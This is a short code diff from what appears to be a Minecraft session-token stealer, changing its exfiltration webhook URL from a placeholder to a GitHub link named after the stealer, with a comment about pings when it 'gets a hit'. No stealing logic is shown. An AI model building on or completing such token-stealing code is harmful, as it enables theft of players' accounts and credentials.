@@ -3,7 +3,7 @@ import os
 from urllib.request import Request, urlopen
 
 # your webhook URL
-WEBHOOK_URL = "WEBHOOK HERE"
+WEBHOOK_URL = "https://github.com/wodxgod/Minecraft-Session-Token-Stealer"
 
 # mentions you when you get a hit
 PING_ME = False
